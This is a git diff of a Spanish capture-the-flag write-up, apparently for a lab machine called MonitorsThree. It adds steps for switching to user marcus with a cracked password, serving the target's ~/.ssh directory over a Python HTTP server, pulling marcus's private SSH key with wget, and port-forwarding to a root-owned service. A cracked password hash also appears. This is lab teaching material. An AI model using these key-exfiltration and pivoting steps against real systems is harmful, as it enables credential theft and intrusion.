@@ -17,8 +17,9 @@ image: https://github.com/user-attachments/assets/17fc44c9-d486-4d62-aee3-3b1495
 * Abusing Cacti 1.2.26 Authentication Remote Command Execution (CVE-2024-25641)
 * Information Lekeage (config.php)
 * Cracking hashes (hashcat)
-* Chisel Remote Port Forwarding
+* SSH Local Port Forwarding
 * Duplicati login bypass
+* 
 
 ## Enumeration
 
@@ -574,7 +575,10 @@ $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
 Intento migrar el usuario marcus con la contraseña obtenida, puediendo obtener acceso de manera existosa
 
 ```bash
-
+www-data@monitorsthree:~/html/cacti/resource$ su marcus
+Password: 
+marcus@monitorsthree:/var/www/html/cacti/resource$ whoami
+marcus
 ```
 
 ### Privilege escalation
@@ -598,4 +602,32 @@ udp        0      0 127.0.0.53:53           0.0.0.0:*                           
 udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          33226      -  
 ```
 
-Visualizo que se encuentra el puerto 8200 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo 
+Visualizo que se encuentra el puerto 8200 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo ssh para realizar un Local Port Forwarding, pero al intentarlo obtengo que necesito autenticarme con clave ssh.
+
+```bash
+ssh -L 8200:127.0.0.1:8200 marcus@10.10.11.30
+marcus@10.10.11.30: Permission denied (publickey).
+```
+
+Utilizo un servidor en Python3 para traer a mi equipo la clave del usuario marcus y así poder realizar el Local Port Forwarding.
+
+```bash
+marcus@monitorsthree:~/.ssh$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```bash
+wget http://10.10.11.30:8000/id_rsa
+--2025-01-27 14:53:56--  http://10.10.11.30:8000/id_rsa
+Connecting to 10.10.11.30:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2610 (2,5K) [application/octet-stream]
+Saving to: ‘id_rsa’
+```
+
+Utilizo ssh con la clave de marcus para realizar un local port forwarding y traer el puerto 8200 de la máquina a mi puerto 8200.
+
+```bash
+ssh -L 8200:127.0.0.1:8200 marcus@10.10.11.30 -i id_rsa -fN
+```
+
